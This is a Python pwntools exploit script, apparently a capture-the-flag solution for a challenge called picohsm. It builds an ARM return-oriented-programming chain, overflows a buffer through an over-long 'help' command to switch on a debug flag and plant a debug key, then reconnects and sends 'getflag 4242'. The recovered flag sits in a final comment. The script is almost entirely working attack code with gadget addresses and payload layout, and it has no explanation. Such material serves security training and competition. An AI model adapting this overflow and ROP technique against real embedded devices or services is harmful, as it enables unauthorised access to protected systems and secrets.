#!/usr/bin/python
from pwn import *

context(arch='arm', log_level='DEBUG')

hsm = 0x20000000
debug_enabled = 0x20000008
debug_key = 0x2000000C

served = 0x08000724

str_r5 = 0x08000912 # STR R5, [R3,#4]; POP {R3-R5,PC}
pop_r3r5 = 0x08000914 # POP {R3-R5,PC}

mov_r0 = 0x8000cc0 # mov r0, r4; pop {r4, pc}
pop_r4 = 0x8000532 # pop {r4, pc}

w5500 = 0x20000010

# 0x080008a2
# STR     R2, [R3,#0xC]
# POP     {R4-R6,PC}
# 0x08000cc0 MOV     R0, R4
# POP     {R4,PC}

rop = (
  # pop {r4, pc}
  p32(0) +            # r4
  # p32(pop_r4 + 1) + # pc
  # p32(w5500) +        # r4 / socket.1

  p32(pop_r3r5 + 1) + # pc
  p32(w5500) +        # r3 / socket.1
  p32(0) +            # r4 / socket.2
  p32(0) +            # r5

  p32(pop_r3r5 + 1) +
  p32(debug_enabled - 0x4) + # r3
  p32(0) + # r4
  p32(1) + # r5
  
  p32(str_r5 + 1) +
  p32(debug_key - 0x4) + # r3
  p32(0) + # r4
  p32(4242) + # r5

  p32(str_r5 + 1) +
  p32(0) + # r3
  p32(0) + # r4
  p32(0) + # r5
  p32(served + 1) +
  p32(w5500) +
  p32(0)
)

p = remote('picohsm.donjon-ctf.io', 8008)
p.recvuntil('Timeout in 15 seconds...')

payload = b'help 1 2 3 4 5 6 7 8 9 a\n'.ljust(0x300, b'\x00') + rop
assert len(payload) <= 0x400
p.send(payload)
p.recvuntil('decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.\n')
p.close()

sleep(1)

p = remote('picohsm.donjon-ctf.io', 8008)
p.recvuntil('Timeout in 15 seconds...')
p.send('getflag 4242\n')
print(p.recvuntil('\n'))
print(p.recvuntil('\n'))
p.close()

# CTF{Ju5t_A_W4rmUP}
